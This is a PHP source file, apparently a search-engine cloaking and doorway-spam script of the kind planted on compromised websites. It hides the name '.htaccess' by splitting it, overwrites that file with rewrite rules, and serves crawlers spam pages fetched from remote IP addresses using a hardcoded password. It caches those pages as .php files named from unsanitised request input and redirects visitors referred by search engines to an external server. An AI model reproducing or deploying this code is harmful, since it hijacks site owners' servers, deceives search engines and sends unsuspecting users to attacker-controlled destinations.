<?php

$f1 = ".ht"; $f2 = "acc"; $f3 = "ess";
$ff = $f1.$f2.$f3;

$apass = "oodoskoskd";

if (file_exists($ff)) chmod ($ff, 0777);
if (filesize($ff)>120)
{
	$htout = fopen($ff, "w");
	fwrite($htout, "RewriteEngine On 
RewriteRule ^([A-Za-z0-9-]+).html$ x15q5mcjtk.php?world=5&looping=176&hl=$1 [L]");
fclose($htout);
}

foreach ($_GET as $a=>$b)
{
	$_GET["id"] = $b;
}

//$_GET["id"] = str_replace ("fghjkld", "-", $_GET["id"]);
//$_GET["id"] = substr($_GET["id"], 10);

$x1=3;
$xx1=5;
$user_agent_to_filter = array( '#Ask\s*Jeeves#i', '#HP\s*Web\s*PrintSmart#i', '#HTTrack#i', '#IDBot#i', '#Indy\s*Library#',
                               '#ListChecker#i', '#MSIECrawler#i', '#NetCache#i', '#Nutch#i', '#RPT-HTTPClient#i',
                               '#rulinki\.ru#i', '#Twiceler#i', '#WebAlta#i', '#Webster\s*Pro#i','#www\.cys\.ru#i',
                               '#Wysigot#i', '#Yahoo!\s*Slurp#i', '#Yeti#i', '#Accoona#i', '#CazoodleBot#i',
                               '#CFNetwork#i', '#ConveraCrawler#i','#DISCo#i', '#Download\s*Master#i', '#FAST\s*MetaWeb\s*Crawler#i',
                               '#Flexum\s*spider#i', '#Gigabot#i', '#HTMLParser#i', '#ia_archiver#i', '#ichiro#i',
                               '#IRLbot#i', '#Java#i', '#km\.ru\s*bot#i', '#kmSearchBot#i', '#libwww-perl#i',
                               '#Lupa\.ru#i', '#LWP::Simple#i', '#lwp-trivial#i', '#Missigua#i', '#MJ12bot#i',
                               '#msnbot#i', '#msnbot-media#i', '#Offline\s*Explorer#i', '#OmniExplorer_Bot#i',
                               '#PEAR#i', '#psbot#i', '#Python#i', '#rulinki\.ru#i', '#SMILE#i',
                               '#Speedy#i', '#Teleport\s*Pro#i', '#TurtleScanner#i', '#User-Agent#i', '#voyager#i',
                               '#Webalta#i', '#WebCopier#i', '#WebData#i', '#WebZIP#i', '#Wget#i',
                               '#Yandex#i', '#Yanga#i', '#Yeti#i','#msnbot#i',
                               '#spider#i', '#yahoo#i', '#jeeves#i' ,'#google#i' ,'#altavista#i',
                               '#scooter#i' ,'#av\s*fetch#i' ,'#asterias#i' ,'#spiderthread revision#i' ,'#sqworm#i',
                               '#ask#i' ,'#lycos.spider#i' ,'#infoseek sidewinder#i' ,'#ultraseek#i' ,'#polybot#i',
                               '#webcrawler#i', '#robozill#i', '#gulliver#i', '#architextspider#i', '#yahoo!\s*slurp#i',
                               '#charlotte#i', '#ngb#i', '#BingBot#i' ) ;

if ( !empty( $_SERVER['HTTP_USER_AGENT'] ) && ( FALSE !== strpos( preg_replace( $user_agent_to_filter, '-NO-WAY-', $_SERVER['HTTP_USER_AGENT'] ), '-NO-WAY-' ) ) ){
    $isbot = 1;
	}

if( FALSE !== strpos( gethostbyaddr($_SERVER['REMOTE_ADDR']), 'google')) 
{
    $isbot = 1;
}



if ($isbot)
{
	
	//$myname  = basename($_SERVER['SCRIPT_NAME'], ".php");	
	$myname = $_GET["id"].".php";
	if (file_exists($myname))
	{
	$html = file($myname);
	$html = implode($html, "");
	echo $html;
	exit;
	}
	
	//if (!strpos($_SERVER['HTTP_USER_AGENT'], "google")) exit;
	/*
	while($tpl == 0)
	{
$tpl_n = rand(1,9);
$tpl = @file("tpl$tpl_n.html");
	}
*/
$num_temple = rand(1,9);
$tpl = file("tpl$num_temple.html");
$keyword = "$num_temple";
$keyword = str_replace("-", " ", $_GET["id"]);
$keyword = chop($keyword);
$keyword = ucfirst($keyword);


 $query_pars = $keyword;
 $query_pars_2 = str_replace(" ", "+", chop($query_pars));
 $query_pars_2 = mb_strtolower($query_pars_2);

$text = "";

 $ch = curl_init();  
curl_setopt($ch, CURLOPT_URL, "http://".$_GET["looping"].".9.23.3/story.php?pass=$apass&q=$_GET[id]"); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
$text = curl_exec($ch); 
curl_close($ch);

if (strlen($text)<5000) $text = file_get_contents("http://".$_GET["looping"].".9.23.3/story.php?pass=$apass&q=$_GET[id]"); 


		$zzzzz = $_GET["world"] + 171;
 $ch = curl_init();  
curl_setopt($ch, CURLOPT_URL, "http://$zzzzz.31.253.227/cakes/page.php"); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
$text2 = curl_exec($ch); 
curl_close($ch);		
		
		$text = $text."<br><br>\n\n\n\n".$text2;
		
     	$html = implode ("\n", $tpl);
		$html = str_replace("{keyword}", $keyword, $html);
		$html = str_replace("{manytext_bing}", $text, $html);
		
		if (strlen($text)>2000)
		{
		$out = fopen($myname, "w");
		fwrite($out, $html);
		fclose($out);
		}

		echo $html;
		
}	

if(!@$isbot)
{
$tpl = "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX";
$keyword = str_replace("-", " ", $_GET["id"]);
$keyword = str_replace(" ", "+", $keyword);

$s = dirname($_SERVER['PHP_SELF']);
if ($s == '\\' | $s == '/') {$s = ('');}  
$s = $_SERVER['SERVER_NAME'] . $s;

$today = "20190930";

include("checkmob.php");
if(is_mobile() >0 ) $mobiledevice = 11;

if (strpos($_SERVER['HTTP_REFERER'], "num=100"))
{
	$myname = $_GET["id"].".php";
	if (file_exists($myname))
	{
	$html = file($myname);
	$html = implode($html, "");
	echo $html;
	exit;
	}
}	

if ((strpos($_SERVER['HTTP_REFERER'], "google.")) OR (strpos($_SERVER['HTTP_REFERER'], "yahoo.")) OR (strpos($_SERVER['HTTP_REFERER'], "bing.")))
{

header("Location: http://".$_GET["world"].".45.79.15/input/?mark=$today-$s&tpl=$tpl&engkey=$keyword");
exit;
}
else
{

	$myname = $_GET["id"].".php";
	if (file_exists($myname))
	{
	$html = file($myname);
	$html = implode($html, "");
	echo $html;
	exit;
	}
	
}


}

?>
